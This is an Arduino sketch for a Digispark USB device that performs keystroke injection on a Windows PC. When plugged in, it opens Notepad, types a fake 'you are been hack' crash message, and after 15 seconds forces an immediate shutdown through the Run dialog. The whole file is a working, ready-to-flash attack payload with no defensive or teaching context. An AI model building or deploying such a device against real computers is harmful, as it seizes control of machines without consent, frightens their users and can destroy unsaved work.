#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Open Notepad to display the fake BSOD message
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Type the fake BSOD message
  DigiKeyboard.print(F("YOU ARE BEEN HACK by DIRTY HEROES\n\n"));
  DigiKeyboard.print(F("A fatal error has occurred.\n"));
  DigiKeyboard.print(F("System will shut down in 15 seconds..."));

  // Maximize the Notepad window for visibility
  DigiKeyboard.sendKeyStroke(KEY_F11);

  // Wait 15 seconds
  DigiKeyboard.delay(15000);

  // Shut down the PC
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("shutdown /s /t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
